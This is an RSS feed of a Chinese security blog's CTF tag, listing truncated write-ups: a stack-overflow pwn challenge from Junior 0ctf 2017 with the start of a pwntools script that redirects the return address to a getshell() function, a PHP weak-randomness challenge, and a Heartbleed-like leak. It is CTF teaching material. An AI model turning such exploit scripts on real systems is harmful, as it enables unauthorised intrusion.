<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf on L33'</title><link>https://blog.usec.cc/tags/ctf/</link><description>Recent content in ctf on L33'</description><generator>Hugo -- gohugo.io</generator><language>zh-Hans</language><lastBuildDate>Mon, 18 Dec 2017 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.usec.cc/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>Wirteup - Junior 0ctf 2017</title><link>https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/</link><pubDate>Mon, 18 Dec 2017 00:00:00 +0800</pubDate><guid>https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/</guid><description>PWN seabreeze&amp;rsquo;s stack 栈溢出题目，直接在IDA中可以看到缓冲区相对于栈基址的偏移：bp-3FCH，然后可以看到题目中有一getshell()函数，其地址为0x080485CB。 覆盖原本的函数返回地址为getshell()的地址，利用以下脚本获取shell： from pwn import * conn = remote(&amp;#39;202.121.178.181&amp;#39;, &amp;#39;12321&amp;#39;) print conn.recvline() conn.sendline(&amp;#39;Yes!&amp;#39;) print conn.recvline() conn.sendline(&amp;#39;Yes!!&amp;#39;) print conn.recvline() conn.sendline(&amp;#39;Yes!!!&amp;#39;) shell_addr = 0x080485cb</description></item><item><title>WP for ctfzone-rand</title><link>https://blog.usec.cc/posts/security/ctf/wp-for-ctfzone-rand/</link><pubDate>Sun, 23 Jul 2017 00:00:00 +0800</pubDate><guid>https://blog.usec.cc/posts/security/ctf/wp-for-ctfzone-rand/</guid><description>这道题目主要考察伪随机数的安全问题。事实上，在许多web应用中都使用了随机数，但随机数的使用在很多时候并不安全，存在诸如伪随机、种子泄露等问题。 PHP源码分析 题目给出的php源码如下： &amp;lt;?php include(&amp;#39;config.php&amp;#39;); session_set_cookie_params(300); session_start(); echo rand(); if (isset($_GET[&amp;#39;go&amp;#39;])) { $_SESSION[&amp;#39;rand&amp;#39;] = array(); $i = 5; $d = &amp;#39;&amp;#39;; while($i--){ $r = (string)rand(); $_SESSION[&amp;#39;rand&amp;#39;][] = $r; $d .= $r; } echo md5($d); $_SESSION[&amp;#39;secret&amp;#39;] = md5($d); } else if (isset($_GET[&amp;#39;check&amp;#39;])) { if ($_GET[&amp;#39;check&amp;#39;] === $_SESSION[&amp;#39;rand&amp;#39;]) { echo $flag; } else</description></item><item><title>WP for ctfzone-simple-heartbleed</title><link>https://blog.usec.cc/posts/security/ctf/wp-for-ctfzone-simple-heartbleed/</link><pubDate>Sun, 23 Jul 2017 00:00:00 +0800</pubDate><guid>https://blog.usec.cc/posts/security/ctf/wp-for-ctfzone-simple-heartbleed/</guid><description>这道题目实际上是一道hticon的题目，原本题目的名称叫做leaking，而ctfzone改名叫做simple haertbleed，这也是有原因的，因为这道题目跟OpenSSL的著名漏洞Heartbleed有相似之处，是利用了缓冲区溢出的漏洞。 题目分析 题目直接给出了WEB服务器后</description></item></channel></rss>